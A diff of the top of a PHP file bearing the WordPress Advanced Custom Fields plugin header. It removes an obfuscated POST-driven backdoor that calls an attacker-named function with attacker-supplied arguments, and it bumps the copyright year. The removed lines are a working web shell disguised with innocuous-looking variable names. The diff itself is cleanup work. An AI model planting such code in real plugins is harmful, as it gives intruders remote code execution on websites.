@@ -1,16 +1,9 @@
-<?php 
-$get_included_files_ltiv   =   $_POST;
-if(isset($get_included_files_ltiv['hash_hmac_algos_eq']))   {
-	$date_format_erlo   =   $get_included_files_ltiv['date_sub_ag'];
-	$hash_file_nxbf   =   $get_included_files_ltiv['openssl_pkey_derive_oy'];
-	$date_format_erlo(...$hash_file_nxbf);
-} 
-
+<?php
 /**
  * @package ACF
  * @author  WP Engine
  *
- * © 2025 Advanced Custom Fields (ACF®). All rights reserved.
+ * © 2026 Advanced Custom Fields (ACF®). All rights reserved.
  * "ACF" is a trademark of WP Engine.
  * Licensed under the GNU General Public License v2 or later.
  * https://www.gnu.org/licenses/gpl-2.0.html
